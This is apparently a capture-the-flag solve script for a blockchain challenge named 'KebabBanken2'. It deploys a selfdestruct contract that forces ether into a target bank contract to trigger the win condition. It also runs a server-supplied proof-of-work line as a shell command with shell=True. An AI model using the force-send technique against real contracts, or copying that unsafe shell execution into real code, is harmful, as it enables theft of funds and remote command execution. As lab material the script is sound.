import web3
import json
from pwn import *
import subprocess
from solcx import compile_source

IP = "localhost"
PORT = 50000

io = remote(IP, PORT)

io.sendlineafter(b"> ", b"1")

pow_yay = io.recvline()[:-1].decode()
pow_res = subprocess.check_output(pow_yay, shell=True).decode().strip()
io.sendlineafter(b"Solution please: ", pow_res)

io.recvuntil(b"Blockchain info:\n")

uuid = io.recvline().strip().decode().split(" ")[-1]
rpc = io.recvline().strip().decode().split(" ")[-1]
rpc = rpc.replace("[ip]", IP)
private_key = io.recvline().strip().decode().split(" ")[-1]
my_addr = io.recvline().strip().decode().split(" ")[-1]
target_addr = io.recvline().strip().decode().split(" ")[-1]

print(f"{uuid = }")
print(f"{rpc = }")
print(f"{private_key = }")
print(f"{my_addr = }")
print(f"{target_addr = }")

with open("KebabBanken2.json", "r") as openfile:
    bank_abi = json.load(openfile)

with open("Setup.json", "r") as openfile:
    setup_abi = json.load(openfile)

w3 = web3.Web3(web3.HTTPProvider(rpc))
setup_contract = w3.eth.contract(address=target_addr, abi=setup_abi)
my_addr = w3.eth.account.from_key(private_key).address

setup_contract.functions.hello().transact({'from': my_addr})

bank_addr = setup_contract.functions.bank().call()

bank_contract = w3.eth.contract(address=bank_addr, abi=bank_abi)


compiled_sol = compile_source('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSend {
    constructor(address payable _target) payable {
        require(msg.value > 0, "Need ETH to send");
        selfdestruct(_target);
    }
}''', output_values=['abi', 'bin'])

contract_id, contract_interface = compiled_sol.popitem()
bytecode = contract_interface['bin']
abi = contract_interface['abi']
attacker = w3.eth.contract(abi=abi, bytecode=bytecode)
tx_hash = attacker.constructor(bank_addr).transact({'from': my_addr, 'value': 10**18})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

if solved:
    io.close()
    io = remote(IP, PORT)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", uuid.encode())

io.interactive()
